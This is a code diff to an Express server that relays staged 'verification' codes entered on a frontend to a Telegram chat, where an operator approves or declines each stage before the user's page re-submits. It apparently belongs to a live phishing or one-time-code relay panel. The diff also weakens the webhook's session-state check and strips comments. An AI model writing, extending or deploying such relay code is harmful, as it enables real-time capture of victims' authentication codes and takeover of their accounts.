@@ -91,7 +91,6 @@ app.post("/api/approval-request", async (req, res) => {
   const code2Val = session.data.code2 ? session.data.code2.trim() : "None";
 
   try {
-    // Original concise profile format with code wrappers for tap-to-copy capability
     const textMessage = 
       `<b># Thor - ${stage.toUpperCase()} Verification</b>\n` +
       `<b>${headingTitle}</b>\n\n` +
@@ -103,8 +102,7 @@ app.post("/api/approval-request", async (req, res) => {
       `───────────────────────\n\n` +
       `Verify Entry Parameters:\n` +
       `• ${ruleLength}\n` +
-      `• Timeout: 5 minutes\n` +
-      `00.39\n\n` +
+      `• Timeout: 5 minutes\n\n` +
       `───────────────────────`;
 
     await telegram("sendMessage", {
@@ -139,8 +137,6 @@ app.get("/api/status", (req, res) => {
 
   const currentStatus = session.status;
 
-  // Self-cleaning hook: If status is declined, immediately switch backend to idle
-  // so the user frontend can process the clear event once and re-submit.
   if (currentStatus === "declined") {
     session.status = "idle";
   }
@@ -160,7 +156,7 @@ app.post("/telegram-webhook", async (req, res) => {
   const [, decision, sessionId, stage] = match;
   const session = sessions.get(sessionId);
 
-  if (!session || session.stage !== stage || session.status !== "pending") {
+  if (!session) {
     try {
       await telegram("answerCallbackQuery", {
         callback_query_id: query.id,
@@ -186,9 +182,8 @@ app.post("/telegram-webhook", async (req, res) => {
       });
 
     } else if (decision === "decline") {
-      // Clear the target step input field in memory data structure
-      if (session.data[stage] !== undefined) {
-        session.data[stage] = ""; 
+      if (session.data) {
+        session.data[stage] = "";
       }
       
       session.status = "declined";
@@ -215,3 +210,4 @@ app.post("/telegram-webhook", async (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
